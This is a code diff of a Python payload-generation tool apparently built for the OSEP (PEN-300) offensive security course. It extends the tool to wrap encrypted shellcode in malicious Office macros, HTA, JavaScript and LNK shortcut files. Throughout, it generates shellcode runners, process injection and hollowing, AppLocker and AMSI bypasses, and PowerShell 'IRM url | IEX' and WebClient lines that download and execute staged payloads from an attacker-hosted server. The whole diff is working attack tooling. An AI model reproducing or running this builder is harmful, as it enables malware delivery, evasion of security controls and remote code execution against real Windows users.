@@ -3,7 +3,7 @@ import argparse
 import tempfile
 import shutil
 
-from tradecraft import c, cs, ps, vba
+from tradecraft import c, cs, ps, vba, lnk
 from tradecraft.utils import *
 
 from urllib.parse import urlparse
@@ -11,15 +11,16 @@ from urllib.parse import urlparse
 rootdir = os.path.dirname(__file__)
 
 def argparser():
-    input_format = ['', '.raw', '.bin', '.txt', '.exe', '.dll']
-    output_format = ['', '.elf', '.exe', '.dll', '.ps1', '.ps', '.doc', '.docm', '.hta', '.js', '.xml']
+    containers_ext = ['.doc', '.docm', '.hta', '.js', '.lnk']
+    input_ext = ['', '.raw', '.bin', '.txt', '.exe', '.dll']
+    output_ext = ['', '.elf', '.exe', '.dll', '.ps1', '.ps'] + containers_ext
 
     parser = argparse.ArgumentParser(description='Tradcrafts automation for Offensive Security PEN-300 (OSEP)', formatter_class=ArgumentFormatter)
     
     methods = parser.add_mutually_exclusive_group(required=True)
     
-    parser.add_argument('-i', '--input', required=True, help=f'input file format: ({', '.join(input_format[1:])})')
-    parser.add_argument('-o', '--output', required=True, help=f'output file format: ({', '.join(output_format[1:])})')
+    parser.add_argument('-i', '--input', required=True, help=f'input file format: ({', '.join(input_ext[1:])})')
+    parser.add_argument('-o', '--output', required=True, help=f'output file format: ({', '.join(output_ext[1:])})')
     parser.add_argument('-s', '--server', type=urlparse, help='stage the payload')
     parser.add_argument('-c', '--class', dest='_class', help='class name (required for .NET DLL)')
     parser.add_argument('-m', '--method', help='method for DLL. (required for .NET DLL)')
@@ -45,20 +46,22 @@ def argparser():
     parser.add_argument('--platform', choices=['windows', 'linux'], type=str.lower, default='windows', help='payload platform')
     parser.add_argument('--arch', choices=['x32', 'x64', 'any'], type=str.lower, default='any', help='payload architecture')
     
-    parser.add_argument('--delay', type=int, help='delay payload execution')
-    parser.add_argument('-e', '--encrypt', choices=[None, 'AES', 'XOR', 'ROT'], default='XOR', type=lambda v: None if v.lower() == 'none' else v.upper(), help='encrypt the payload')
+    parser.add_argument('--delay', type=int, default=0, help='delay payload execution')
+    parser.add_argument('-e', '--encrypt', choices=[None, 'AES', 'XOR', 'ROT'], default='AES', type=lambda v: None if v.lower() == 'none' else v.upper(), help='encrypt the payload')
     parser.add_argument('--hide', help='hide windows console', action='store_true')
+
+    parser.add_argument('--doc', choices=['shell', 'wmi'], default='shell', type=str.lower, help='doc execution method')
 
     parser.add_argument('-v', '--verbose', help='verbose output', action='count')
     parser.add_argument('-q', '--quiet', help='hide banner', action='store_true')
 
     args = parser.parse_args()
 
-    if os.path.splitext(args.input)[1] not in input_format:
-        parser.error('supported input extensions: ' + ', '.join(input_format[1:]))
+    if os.path.splitext(args.input)[1] not in input_ext:
+        parser.error('supported input extensions: ' + ', '.join(input_ext[1:]))
     
-    if os.path.splitext(args.output)[1] not in output_format:
-        parser.error('supported output extensions : ' + ', '.join(output_format[1:]))
+    if os.path.splitext(args.output)[1] not in output_ext:
+        parser.error('supported output extensions : ' + ', '.join(output_ext[1:]))
     
     if args.platform == 'linux' and not args.run:
         parser.error('supported platform: windows extensions')
@@ -96,7 +99,7 @@ def donut(input, output, arch='any', amsi=True, _class=None, method=None, verbos
 
 def mcs(input, output, arch='any', links=[], delay=None, encrypt=None, hide=None, verbose=False):
     arch = arch.lower().replace('x32', 'x86').replace('any', 'anycpu')
-    command = ['mcs', '-unsafe', '-platform:'+arch, input, '-out:'+output]
+    command = ['mcs', '-unsafe', '-platform:'+arch, input, '-out:'+output]# '-sdk:4.5'
     if links:
         command.append(' '.join('-r:'+link for link in links))
     defines = []
@@ -151,7 +154,10 @@ def main():
     output_basename = os.path.basename(args.output)
     output = os.path.join(tempdir, output_basename)
     target = output
-    if (output_ext == '.doc' or output_ext == '.docm'):
+
+    containers_ext = ['.doc', '.docm', '.hta', '.js', '.lnk']
+
+    if (output_ext in containers_ext):
         target = target.replace(output_ext, '.exe')
     target_basename = os.path.basename(target)
     target_path = os.path.splitext(target)[0]
@@ -162,7 +168,7 @@ def main():
     if input_ext in ['', '.bin', '.raw', '.txt']:
         input_file = args.input
 
-    elif input_ext in ['.exe', '.dll', '.doc', '.docm']:
+    elif input_ext in ['.exe', '.dll']:
         print_info('Generating shellcode using donut')
         shellcode_arch = get_arch(args.input)
         donut(args.input, os.path.join(tempdir, 'shellcode.bin'), args.arch, args.amsi, args._class, args.method, args.verbose)
@@ -193,7 +199,7 @@ def main():
                 f.write(code)
 
             print_info('Building stager payload')
-            mcs(target_path+'.cs', target_path+'.exe', arch=args.arch, encrypt=args.encrypt, hide=args.hide, verbose=args.verbose)
+            mcs(target_path+'.cs', target_path+'.exe', arch=args.arch, delay=args.delay, encrypt=args.encrypt, hide=args.hide, verbose=args.verbose)
             donut(target_path+'.exe', os.path.join(tempdir, 'shellcode.bin'), arch=args.arch, amsi=args.amsi, verbose=args.verbose)
             print_success('Payload stager generated')
 
@@ -202,7 +208,7 @@ def main():
             
             shellcode, key, iv  = encrypt(args.encrypt, shellcode, key, iv)
 
-    if output_ext in ['.exe', '.dll', '.doc', '.docm']:
+    if output_ext in ['.exe', '.dll'] + containers_ext:
         if args.run:
             print_info('Generating shellcode runner payload')
             code = cs.shellcode_runner(shellcode, args.encrypt, key, iv, args.delay)
@@ -210,7 +216,7 @@ def main():
             print_info('Generating process injection payload')
             code = cs.process_injection(shellcode, args.encrypt, key, iv, args.delay, args.process, shellcode_arch)
         elif args.hollow:
-            print_info('Generating process hollowing  payload')
+            print_info('Generating process hollowing payload')
             code = cs.process_hollowing(shellcode, args.encrypt, key, iv, args.delay, args.process, shellcode_arch)
         
         with open(os.path.join(tempdir,'program.cs'), 'w') as f:
@@ -232,13 +238,13 @@ def main():
         print_success('Payload generated')
         
     if args.server:
-        if output_ext in ['.exe', '.dll', '.doc', '.docm']:
+        if output_ext in ['.exe', '.dll'] + containers_ext:
             if args.reflection or args.applocker:
                 arch = '' if shellcode_arch == 'x32' else '64'
                 if args.applocker:
                     print_info(f'Generating {args.applocker} payload')
                     cs_code, xml_code = cs.applocker_bypass(args.applocker, args.applocker_path, target_name, url+'/'+target_basename)
-                    ps_code = ps.applocker_bypass(args.applocker, url, args.applocker_path, target_name, arch, args.amsi)
+                    ps_code = ps.applocker_bypass(args.applocker, url, args.applocker_path, target_name, arch, args.amsi, args.clm)
 
                     if xml_code:
                         with open(target_path+'.xml', 'w') as f:
@@ -248,29 +254,28 @@ def main():
                             f.write(cs_code)
                         
                     if args.applocker == 'installutil':  
-                        mcs(target_path+'.cs', target_path+'.txt', links=['System.Configuration.Install.dll'], arch=args.arch, hide=args.hide, verbose=False)
+                        mcs(target_path+'.cs', target_path+'.txt', links=['System.Configuration.Install.dll'], arch=args.arch, delay=args.delay, hide=args.hide, verbose=False)
 
                 elif args.reflection:
-                    ps_code = ps.assembly_reflection(url+'/'+target_basename, args.amsi)
+                    ps_code = ps.assembly_reflection(url+'/'+target_basename, args.amsi, args.clm)
                 
                 with open(target_path+'.ps1', 'w') as f:
-                        f.write(ps_code)
+                        f.write(ps_code.strip())
                 
-                if args.clm :
-                    ps_command = f'(New-Object System.Net.WebClient).DownloadString("{url}/{target_basename}") | IEX'
-                else:
-                    ps_command = f'IRM {url}/{target_name}.ps1 | IEX'
+                #ps_command = f'(New-Object System.Net.WebClient).DownloadString("{url}/{target_basename}") | IEX'
+                ps_command = f'IRM {url}/{target_name}.ps1 | IEX'
                 
                 if output_ext in ['.doc', '.docm']:
                     if output_ext == '.doc':
-                        doc_file = vba.doc(ps_command)
+                        doc_file = vba.doc(ps_command, args.doc)
                     elif output_ext == '.docm':
-                        doc_file = vba.docm(ps_command)
+                        doc_file = vba.docm(ps_command, args.doc)
                     with open(output, 'wb') as f:
                         f.write(doc_file)
                     ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{output_basename}", "{output_basename}");'
-                    
-            
+                elif output_ext in ['.hta', '.js', '.lnk']:
+                    lnk.shortcut('powershell', ps_command, output)
+
             elif output_ext == '.exe':
                 ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{target_basename}", "{target_basename}"); .\\{target_basename}'   
             else:
@@ -278,7 +283,7 @@ def main():
 
         elif output_ext in ['.ps1', '.ps']:
             print_info('Generating powershell payload')
-            ps_command = ps.amsi if args.amsi else ''
+            ps_command = ps.amsi if args.amsi and not args.clm else ''
             ps_command += f'IRM {url}/{target_basename} | IEX'
         
         else:
@@ -308,6 +313,8 @@ def main():
         
         shutil.copy(output, args.output) 
         httpd.serve_forever()
+    else:
+        shutil.copy(output, args.output) 
 
 if __name__ == '__main__':
     try:
